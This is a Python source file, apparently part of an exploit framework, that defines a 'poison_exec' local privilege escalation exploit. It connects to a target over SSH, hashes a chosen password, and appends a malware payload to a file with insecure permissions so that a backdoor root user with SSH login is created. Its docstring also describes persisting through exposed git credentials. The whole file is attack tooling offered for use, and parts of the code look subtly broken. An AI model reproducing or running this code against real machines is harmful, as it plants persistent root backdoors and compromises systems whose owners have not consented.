from datetime import datetime
import os
from pathlib import Path
import subprocess
from typing import Optional
import paramiko
from prompt_toolkit import prompt
import typer
from cveforge.core.commands.run import tcve_exploit
from cveforge.core.context import Context


@tcve_exploit(
    name="poison_exec",
    related_softwares=["insecure chmod file stats"],
    date=datetime(2024, 8, 15),
    categories=["privilege escalation", "linux", "local privilege escalation"],
)
def main(
    hostname: str = typer.Option(),
    port: int = typer.Option(),
    identity_file: str = typer.Option(),
    username: str = typer.Option(),
    passphrase: str = typer.Option(),
    vulnerable_path: str = typer.Option(),
    backdoor_user: str = typer.Option(),
    backdoor_password: Optional[str] = typer.Option(),
):
    """
    Given a binary with unproper permissions, modify the binary to create:

    An user with root privileges.
    Makes sure the new user can login through SSH connection.

    Supports python files and shell scripts.
    Persist changes into the target machine using the target git credentials if exposed
    """
    context: Context = Context()
    client = paramiko.SSHClient()
    client.connect(
        hostname=hostname,
        port=port,
        key_filename=identity_file,
        username=username,
        passphrase=passphrase,
    )
    file_transport = client.open_sftp()

    encrypted_password = subprocess.check_output(
        f"openssl passwd -6 {backdoor_password or prompt('>> ')}"
    )

    os.environ.setdefault("ENCRYPTED_PASS", encrypted_password.decode())
    os.environ.setdefault("NEW_USER", backdoor_user)

    with open(
        context.PAYLOAD_DIR / "src/malwares/python_poison.py", "r"
    ) as malware_python:
        with file_transport.open(vulnerable_path, "a+") as vulnerable_target:
            file_name = Path(vulnerable_path).name
            if file_name.endswith(".py"):
                vulnerable_target.write(malware_python.read())
